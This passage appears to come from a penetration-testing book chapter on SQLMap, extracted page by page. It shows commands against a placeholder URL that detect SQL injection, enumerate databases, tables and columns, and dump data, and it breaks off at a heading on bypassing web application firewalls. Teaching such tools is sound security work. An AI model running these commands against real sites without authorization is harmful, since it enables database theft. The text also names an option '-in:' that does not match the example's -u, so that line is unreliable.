  md: '# CHAPTER 8: SQLMAP


    # Introduction to SQLmap


    SQLMap is an open source tool used to detect and exploit SQL injection vulnerabilities
    in web applications. Designed to be easy to use, SQLMap automates the process
    of identifying and exploiting SQL injection flaws, allowing security professionals
    and pentesters to test the security of their web applications and databases.


    # SQLmap installation


    SQLMap comes pre-installed on Kali Linux. However, if you need to install or update
    it, use the following commands: bash


    ```

    sudo apt update

    sudo apt install sqlmap

    ```


    To verify the installation, run:

    bash


    ```

    sqlmap --version

    ```


    # Main Features


    SQLMap offers a wide range of functionality that includes:'
  merge: -1
  pgno: 79
- img_proc: true
  md: '+   * Detection of SQL injection vulnerabilities.

    * Enumeration of databases, tables and columns.

    * Extracting data from databases.

    * Execution of commands in the operating system through SQL injection.

    * Bypass defense systems such as WAFs (Web Firewalls).


    # # Basic Usage


    # # Vulnerability Detection


    To detect SQL injection vulnerabilities, provide a URL and use the option `-in:`


    ```

    bash

    sqlmap -u "http://example.com/vulnerable.php?id=1"

    ```


    SQLMap will analyze the URL and attempt to identify SQL injection vulnerabilities.


    # # Database Enumeration


    After detecting a vulnerability, you can enumerate the existing databases:


    ```

    bash

    sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs

    ```


    This option lists all databases on the server.


    # # Table Enumeration'
  merge: -1
  pgno: 80
- img_proc: true
  md: 'To list the tables within a specific database, use the option - D followed
    by the name of the database and --tables:


    ```

    bash

    sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name --tables

    ```


    # # Column Enumeration


    To list the columns within a specific table, use the option -T followed by the
    name of the table and --columns:


    ```

    bash

    sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name -T table_name
    --columns

    ```


    # # Data extraction


    To extract data from a specific table, use the option -C followed by the column
    names and --dump:


    ```

    bash

    sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name -T table_name
    -C "column1,column2" --dump

    ```


    # # Advanced Usage


    # # Bypass the WAFs'
